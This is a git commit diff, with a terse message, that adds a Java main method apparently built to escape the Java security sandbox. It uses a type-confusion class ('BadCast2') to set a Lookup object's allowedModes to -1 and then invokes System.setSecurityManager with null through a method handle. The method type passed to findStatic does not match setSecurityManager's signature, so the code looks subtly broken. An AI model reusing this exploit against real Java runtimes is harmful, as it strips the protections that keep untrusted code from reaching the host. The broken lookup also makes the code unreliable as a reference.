dd2310bf2c1749418b9fce955f04c865509f190b
Ny4nc4t <>
2019-05-05 17:50:28 +0200

    qw

--- Main.java
+++ Main.java
@@ -15,3 +15,18 @@ public class Main {
                 throw new BadCast1();
         }
 
+        public static void handleEx(BadCast2 e){
+                e.lm.allowedModes = -1;
+        }
+
+        public static void main(String[] args) throws Throwable {
+                BadCast2 e = new BadCast2();
+                handleEx(e);
+                MethodType mt = MethodType.methodType(void.class, System.class);
+                MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", mt);
+                mh.invokeExact(System.class, null);
+        }
+
+}
+
+
